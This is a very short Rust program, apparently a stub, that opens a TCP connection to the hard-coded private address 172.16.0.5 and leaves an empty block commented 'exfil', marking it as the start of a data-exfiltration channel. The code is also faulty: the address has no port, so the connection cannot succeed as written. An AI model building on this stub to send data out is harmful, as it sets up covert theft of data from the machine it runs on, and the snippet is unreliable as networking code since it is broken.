use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("172.16.0.5") { /* exfil */ }
}
